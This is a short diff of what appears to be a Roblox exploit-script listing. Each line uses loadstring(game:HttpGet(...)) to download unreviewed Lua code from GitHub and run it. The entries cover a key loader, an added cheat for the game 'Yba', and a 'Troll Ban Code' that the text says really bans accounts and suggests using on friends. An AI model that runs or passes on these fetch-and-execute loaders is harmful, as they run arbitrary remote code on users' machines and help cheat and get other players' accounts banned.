@@ -13,6 +13,10 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/GuizzyisbackV2LOL/Gui
 _G.Key = "" 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/GuizzyisbackV2LOL/Key-/main/Source%201"))()
 
+-- Main Code | Yba Code
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GuizzyisbackV2LOL/ybabeta/main/AHawhdgawdh9uawhdaiuw8d9823489045"))()
+For the game Yba Very Op !
+
 -- Main Code | Troll Ban Code
 loadstring(game:HttpGet("https://raw.githubusercontent.com/GuizzyisbackV2LOL/Dahoodban/main/BanCode"))()
 The ban thing is not a joke. Use it on your alt or troll your friends.
